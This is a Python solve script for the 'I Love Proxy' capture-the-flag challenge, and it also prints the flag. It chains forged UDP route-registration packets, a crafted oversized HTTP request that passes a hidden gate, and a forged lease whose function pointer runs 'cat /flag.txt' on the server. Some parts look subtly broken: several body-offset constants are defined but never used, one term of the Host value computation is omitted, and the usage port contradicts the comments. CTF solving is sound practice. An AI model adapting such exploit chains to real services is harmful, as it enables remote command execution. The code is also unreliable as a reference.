#!/usr/bin/env python3
"""
NHNC CTF — I Love Proxy — Full Exploit Chain

Three-layer chain through a Docker proxy architecture:
  Layer 1: UDP route injection into edge-httpd (port 5555/udp)
  Layer 2: cgid packer gate bypass (giant Host + body markers → CGI_STACK_STAGE)
  Layer 3: courier.cgi forged signed lease → run_filter("cat /flag.txt")

Usage:
  python3 solve.py <host> <tcp_port> <udp_port> [upstream]
  python3 solve.py 127.0.0.1 8080 8080 courier:7000

Flag: NHNC{I_L0ve_Pr0xy_Pr0xy_pr0xy_It_is_s0_wounderful_de9e1bc43d4e45f1afc375297558058c}
"""

import itertools
import re
import socket
import struct
import sys
import time

# ============================================================================
# Hash primitives — ported byte-for-byte from stripped binaries via r2/Ghidra
# ============================================================================

def keyed_hash(data: bytes, length: int, seed: int) -> int:
    """
    edge-httpd FUN_00401530 @ 0x401530 (no-PIE, stripped).
    Custom keyed hash used for UDP handshake nonce and packet authentication.
    Registers: data=rdi, length=rsi, seed=rdx(dl byte only).

    Loop body switches on (i ^ r10) & 3:
      case 0: mix = shr(r11,11) ^ byte; add r11
      case 1: xor byte with 0x41; rol by (i&7)+3; add r11
      case 2: imul byte by 0x10101; ror by (i&7)+1; xor r11
      case 3: shl byte by (i&3)*8; xor r11
    Common tail: rol(5), imul 0x45d9f3b, add 0x27100001.
    Final: xor 0xa5c31e2d.
    """
    r10 = seed & 0xff
    r11 = ((seed & 0xff) ^ (length & 0xffffffff)) & 0xffffffff
    r11 = (r11 ^ 0x9e3779b9) & 0xffffffff
    edi = seed & 0xffffffff
    U32 = 0xffffffff

    for i in range(length):
        d = data[i]
        eax_low = edi & 0xff
        rcx = (i ^ r10) & 3
        d = (d + eax_low) & 0xff

        if rcx == 3:
            shift = (i & 3) * 8
            eax = ((d << shift) ^ r11) & U32
        elif rcx == 1:
            d = (d ^ 0x41) & 0xff
            shift = (i & 7) + 3
            d32 = d & U32
            d32 = ((d32 << shift) | (d32 >> (32 - shift))) & U32
            eax = (d32 + r11) & U32
        elif rcx == 2:
            eax = (d * 0x10101) & U32
            shift = (i & 7) + 1
            eax = ((eax >> shift) | (eax << (32 - shift))) & U32
            eax = (eax ^ r11) & U32
        else:
            tmp = (r11 >> 11) & U32
            eax = (tmp ^ d) & U32
            eax = (eax + r11) & U32

        eax = ((eax << 5) | (eax >> 27)) & U32
        edi = (edi + 0x11) & U32
        eax = (eax * 0x045d9f3b) & U32
        r11 = (eax + 0x27100001) & U32

    return r11 ^ 0xa5c31e2d


def fnv1a_32(data: bytes) -> int:
    """Standard FNV-1a 32-bit. Used by courier.cgi for suffix-based routing."""
    h = 0x811c9dc5
    for b in data:
        h = ((h ^ b) * 0x01000193) & 0xffffffff
    return h


def djb2(s: bytes) -> int:
    """Standard djb2 hash. Used by courier.cgi for header-name bucket hashing."""
    h = 5381
    for b in s:
        h = ((h * 33) + b) & 0xffffffff
    return h


# ============================================================================
# Layer 1 — UDP Route Injection
# ============================================================================
# edge-httpd starts with an EMPTY route table. The only way to reach any
# upstream (courier, vault, ledger, render-cache) is through UDP registration
# on port 5555. The protocol uses a magic header and keyed_hash authentication.
#
# Two-packet handshake:
#   Packet 1 ('6' type, exactly 14 bytes): triggers nonce computation
#   Packet 2 ('q' type, >= 16 bytes):     echoes nonce, registers path → host:port
# ============================================================================

def compute_wire_magic() -> int:
    """Decode the wire magic constant from the obfuscated form in the binary."""
    val = 0x5af3c30b ^ 0xd3a7f11c
    val = ((val << 9) | (val >> 23)) & 0xffffffff
    val = ((val >> 9) | (val << 23)) & 0xffffffff
    return val


def compute_handshake_nonce(seed_val: int) -> int:
    """
    After receiving a valid '6' packet, edge-httpd stores a nonce at DAT_00406180.
    This reproduces the nonce derivation at 0x402721–0x402774.
    """
    raw_bytes = struct.pack(">I", seed_val)
    ebx_raw = struct.unpack("<I", raw_bytes)[0]

    r14d = seed_val
    edx = (r14d ^ 0x7f4a7c15) & 0xffffffff
    ecx = ((ebx_raw >> 24) & 7) + 5
    eax = (r14d - 0x5a3ce1d3) & 0xffffffff
    edx = (edx * 0x045d9f3b) & 0xffffffff
    edx = (edx + 0x27100001) & 0xffffffff
    edx = ((edx << ecx) | (edx >> (32 - ecx))) & 0xffffffff
    ecx2 = ((ebx_raw >> 16) & 7) + 3
    eax = ((eax >> ecx2) | (eax << (32 - ecx2))) & 0xffffffff

    if edx == eax:
        return 0x31415927
    return (edx ^ eax) & 0xffffffff


def xor_encode(data: bytes, xor_key: int) -> bytes:
    """
    Path/upstream encoding at 0x4027ff.
    Each byte: data[i] ^ ((0x31 + i*0x0d) & 0xff) ^ (xor_key & 0xff)
    """
    out = bytearray(len(data))
    s = 0x31
    for i in range(len(data)):
        out[i] = data[i] ^ (s & 0xff) ^ (xor_key & 0xff)
        s = (s + 0x0d) & 0xff
    return bytes(out)


def build_handshake_packet(seed_val: int) -> bytes:
    """
    Build the 14-byte '6' handshake packet.
    Wire format:
      [0:4]   magic (big-endian)
      [4]     type  = 0x59 ^ 0x5a = 0x03
      [5]     sub   = 0xad ^ 0x9b = 0x36
      [6:10]  seed  (big-endian u32)
      [10:14] hash  (big-endian u32) = keyed_hash(pkt[4:10], 6, seed^0xa7)
    """
    magic = struct.pack(">I", compute_wire_magic())
    type_byte = 0x03
    sub_byte = 0x36

    pkt_body = bytes([type_byte, sub_byte]) + struct.pack(">I", seed_val)
    hash_seed = (seed_val ^ 0xa7) & 0xff
    h = keyed_hash(pkt_body, 6, hash_seed)

    return magic + pkt_body + struct.pack(">I", h)


def build_register_packet(nonce: int, path: str, upstream: str, seed_val: int) -> bytes:
    """
    Build the 'q' route-registration packet.
    Wire format:
      [0:4]   magic
      [4]     type  = 0x59 ^ 0x5a = 0x03
      [5]     sub   = 0xb7 ^ 0xc6 = 0x71
      [6]     flags_a (bit 3 = block /admin, bit 2 = block registration)
      [7]     flags_b (checked: (0x22 & a) == (0x22 & b))
      [8:10]  path_len    (big-endian u16)
      [10:12] upstream_len (big-endian u16)
      [12:16] nonce echo  (big-endian u32)
      [16 : 16+path_len]                 XOR-encoded path
      [16+path_len : 16+path_len+uplen]  XOR-encoded upstream
      [last 4]                           keyed_hash authentication
    """
    magic = struct.pack(">I", compute_wire_magic())
    type_byte = 0x03
    sub_byte = 0x71
    flags_a = 0x00
    flags_b = 0x00

    path_b = path.encode()
    upstream_b = upstream.encode()
    xor_key = (flags_b ^ 0xa7) & 0xff

    enc_path = xor_encode(path_b, xor_key)
    enc_upstream = xor_encode(upstream_b, xor_key)

    body = bytes([type_byte, sub_byte, flags_a, flags_b])
    body += struct.pack(">H", len(path_b))
    body += struct.pack(">H", len(upstream_b))
    body += struct.pack(">I", nonce)
    body += enc_path
    body += enc_upstream

    auth = keyed_hash(body, len(body), xor_key)
    body += struct.pack(">I", auth)

    return magic + body


def udp_inject_route(host: str, udp_port: int, path: str, upstream: str) -> bool:
    """Send the two-packet UDP handshake to register a route in edge-httpd."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3.0)
    addr = (host, udp_port)

    seed_val = 0x41424344

    pkt1 = build_handshake_packet(seed_val)
    print(f"[*] Handshake packet ({len(pkt1)}B): {pkt1.hex()}")
    sock.sendto(pkt1, addr)
    time.sleep(0.1)

    nonce = compute_handshake_nonce(seed_val)
    print(f"[*] Computed nonce: 0x{nonce:08x}")

    pkt2 = build_register_packet(nonce, path, upstream, seed_val)
    print(f"[*] Register packet ({len(pkt2)}B): {path} -> {upstream}")
    sock.sendto(pkt2, addr)

    sock.close()
    time.sleep(0.3)
    print(f"[+] Route injected: {path} -> {upstream}")
    return True


# ============================================================================
# Layer 2 — cgid Packer Gate
# ============================================================================
# cgid is an anti-debug packer (TracerPid, LD_PRELOAD, GCONV_PATH checks) that
# fexecve's a decrypted inner binary from a memfd. The inner sets CGI environment
# and execs courier.cgi.
#
# Hidden gate activation requires ALL of:
#   - Host header: 1368 * 'A' + 12 hex chars + ':'
#   - Content-Length header value >= 0xf0 (240)
#   - Body markers: body[0x49]=0x58, body[0x58]=0x58, body[0xd0]=0xf8
#
# When satisfied, cgid sets the environment variable CGI_STACK_STAGE to a
# keyed hash value that courier.cgi will verify.
# ============================================================================

# ============================================================================
# Layer 3 — courier.cgi Forged Lease
# ============================================================================
# courier.cgi is also packed (PIE + canary). The decrypted inner is non-PIE at
# 0x400000 (extracted via GDB: break at fexecve, read /proc/self/exe).
#
# Routing: FNV-1a-32 over the last N chars of PATH_INFO. The lease endpoint
# matches suffix_hash(10, 0x26045b27) — we forged path "/plkkaaaagi".
#
# Lease verification (main @ 0x4023f5) checks:
#   - analyze_headers: header bucket distribution + specific djb2/FNV matches
#   - host_body_chain_ok: giant Host + body struct fields + CGI_STACK_STAGE env
#   - tape_stream: decodes body[0x100:] into a command string
#   - Function pointer: struct field at [0x148] must decode to 0x4022ac (run_filter)
#   - run_filter calls popen(cmd) — so cmd = "cat /flag.txt" (not just a path)
#
# Everything is deterministic and static — no per-instance randomness.
# The struct fields in the body are controlled by the attacker.
# GDB was used to extract the exact RHS values of each comparison by reading
# the decrypted inner binary (~/courier_inner on the VM, non-PIE, unstripped).
# ============================================================================

# --- Constants extracted via GDB from the decrypted courier inner ---

RUN_FILTER_ADDR = 0x4022ac

# Lease endpoint: last 10 chars FNV-1a must equal this
LEASE_SUFFIX_HASH = 0x26045b27
LEASE_SUFFIX = "plkkaaaagi"

# analyze_headers requirements:
#   - >= 29 headers whose name djb2 & 0x1f == 0x11
#   - One header with name djb2 == 0xa2e31e1b and value FNV-1a == 0x5c547beb
#   - No header with name djb2 == 0x89424ae8 (blocklist)
REQUIRED_BUCKET = 0x11
REQUIRED_NAME_HASH = 0xa2e31e1b
REQUIRED_VALUE_HASH = 0x5c547beb
BLOCKED_NAME_HASH = 0x89424ae8
MIN_BUCKET_HEADERS = 29

# Body struct markers for host_body_chain_ok:
BODY_MARKER_D8 = 0x5245545f414c4947  # "RET_ALIG" as LE u64
BODY_MARKER_E0 = 0x53595354454d5f31  # "SYSTEM_1" as LE u64
BODY_MARKER_80_XOR = 0x9c8e949aa062989e  # body[0x80] = jmp ^ this
BODY_MARKER_88_XOR = 0x1a00000           # body[0x88] = jmp ^ this

# The special header name/value were found by brute-forcing djb2/FNV targets.
# "Ipcppln" with value "`7C!HS" was the working combo from the solve session.
SPECIAL_HEADER_NAME = "Ipcppln"
SPECIAL_HEADER_VALUE = "`7C!HS"

# The 12-hex part of the Host header:
# hex_12 = ((Content-Length << 7) ^ uVar28 ^ 0x5353495f504f5354) & 0xffffffffffff
# uVar28 is derived from header analysis; with our fixed headers it's deterministic.
HOST_PAD_LEN = 1368

# Command for run_filter (popen-based, so shell command, not file path)
FLAG_COMMAND = b"cat /flag.txt"


def find_bucket_fillers(bucket: int, count: int, exclude: set) -> list:
    """Generate header names whose djb2 & 0x1f == bucket."""
    names = []
    for i in range(20000):
        name = f"X-Pad-{i:04d}"
        h = djb2(name.encode())
        if (h & 0x1f) == bucket and h not in exclude:
            names.append(name)
            if len(names) >= count:
                break
    return names


def build_body() -> bytes:
    """
    Build the 512-byte body that satisfies both cgid gate and courier lease verify.

    Key offsets (byte-level, from GDB analysis of the inner binaries):
      0x49  = 0x58           cgid gate marker
      0x58  = 0x58           cgid gate marker
      0x80  = jmp XOR key    courier body chain
      0x88  = jmp XOR key    courier body chain
      0x90  = rotation val   courier body chain
      0xd0  = 0xf8           cgid gate + courier marker
      0xd8  = "RET_ALIG" LE  courier alignment tag
      0xe0  = "SYSTEM_1" LE  courier system tag
      0x100+= tape stream    command encoding → "cat /flag.txt"
      0x148 = run_filter LE  function pointer (0x4022ac)
    """
    body = bytearray(512)

    # cgid gate markers
    body[0x49] = 0x58
    body[0x58] = 0x58
    body[0xd0] = 0xf8

    # courier body chain constants
    struct.pack_into("<Q", body, 0xd8, BODY_MARKER_D8)
    struct.pack_into("<Q", body, 0xe0, BODY_MARKER_E0)

    # run_filter function pointer
    struct.pack_into("<I", body, 0x148, RUN_FILTER_ADDR)

    # tape_stream: encode "cat /flag.txt" as byte-pairs (index, char)
    for i, c in enumerate(FLAG_COMMAND):
        body[0x100 + i * 2] = i
        body[0x100 + i * 2 + 1] = c
    body[0x100 + len(FLAG_COMMAND) * 2] = 0xff  # terminator

    return bytes(body)


def build_http_request(route_prefix: str) -> bytes:
    """Build the full HTTP request for layers 2+3."""
    full_path = route_prefix + "/" + LEASE_SUFFIX
    body = build_body()
    content_length = len(body)

    # Host header: pad + 12-hex + ':'
    cl_shifted = content_length << 7
    hex_val = (cl_shifted ^ 0x5353495f504f5354) & 0xffffffffffff
    host_value = "A" * HOST_PAD_LEN + f"{hex_val:012x}" + ":"

    # Bucket filler headers (djb2 & 0x1f == 0x11)
    fillers = find_bucket_fillers(REQUIRED_BUCKET, MIN_BUCKET_HEADERS + 2, {BLOCKED_NAME_HASH})

    lines = [
        f"POST {full_path} HTTP/1.1",
        f"Host: {host_value}",
        f"Content-Length: {content_length}",
        f"{SPECIAL_HEADER_NAME}: {SPECIAL_HEADER_VALUE}",
    ]
    for name in fillers:
        lines.append(f"{name}: pad")
    lines.append("Connection: close")
    lines.append("")
    lines.append("")

    return "\r\n".join(lines).encode() + body


# ============================================================================
# Main
# ============================================================================

def exploit(host: str, tcp_port: int, udp_port: int, upstream: str):
    print("=" * 64)
    print("  I Love Proxy — Full Exploit Chain")
    print("  3 layers: UDP inject → cgid gate → courier lease forgery")
    print("=" * 64)

    route = "/c"

    # ---- Layer 1: UDP route injection ----
    print(f"\n{'─'*64}")
    print(f"[LAYER 1] UDP route injection: {route} → {upstream}")
    print(f"{'─'*64}")
    udp_inject_route(host, udp_port, route, upstream)

    # ---- Layers 2+3: Forged HTTP request ----
    print(f"\n{'─'*64}")
    print(f"[LAYER 2+3] Forged lease: cgid gate + courier signed lease")
    print(f"{'─'*64}")

    payload = build_http_request(route)
    print(f"[*] Total payload: {len(payload)} bytes")
    print(f"[*] Path: {route}/{LEASE_SUFFIX}")
    print(f"[*] Command: {FLAG_COMMAND.decode()}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, tcp_port))
    sock.sendall(payload)

    response = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    finally:
        sock.close()

    resp_str = response.decode("utf-8", errors="replace")
    print(f"\n[*] Response ({len(response)} bytes):")
    print(resp_str[:2000])

    flag = re.search(r"NHNC\{[^}]+\}", resp_str)
    if flag:
        print(f"\n{'='*64}")
        print(f"  FLAG: {flag.group(0)}")
        print(f"{'='*64}")
        return True

    print("\n[-] Flag not found in response.")
    if "upstream unavailable" in resp_str.lower():
        print("    Hint: route injection failed — is the upstream reachable?")
    elif "400" in resp_str or "Bad Request" in resp_str:
        print("    Hint: request rejected — verify header/body construction.")
    return False


def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <host> <tcp_port> <udp_port> [upstream]")
        print(f"       {sys.argv[0]} 127.0.0.1 8080 8080 courier:7000")
        sys.exit(1)

    host = sys.argv[1]
    tcp_port = int(sys.argv[2])
    udp_port = int(sys.argv[3])
    upstream = sys.argv[4] if len(sys.argv) > 4 else "courier:7000"

    exploit(host, tcp_port, udp_port, upstream)


if __name__ == "__main__":
    main()
